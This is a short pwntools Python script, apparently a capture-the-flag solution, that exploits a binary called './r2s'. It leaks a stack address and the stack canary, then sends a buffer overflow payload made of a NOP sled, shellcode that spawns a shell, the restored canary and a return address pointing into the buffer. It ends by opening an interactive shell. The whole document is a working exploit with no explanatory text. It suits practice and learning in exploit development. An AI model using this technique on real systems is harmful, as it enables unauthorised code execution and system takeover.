from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './r2s'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
p.recvuntil(b' buf: ')
buf = p.recvuntil(b'\n').decode('utf-8')
info('leak: ' + buf)
leak_canary = b'a' * 88
p.sendlineafter(b'Input: ', leak_canary)
p.recv(0x67)
canary = u64(p.recv(8)) - 0x0a
info('canary: ' + hex(canary))
payload = b'\x90' * 10
payload += bytes(asm(shellcraft.sh()))
payload = payload.ljust(88, b'\x90')
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(int(buf, 16))
p.sendline(payload)
p.interactive()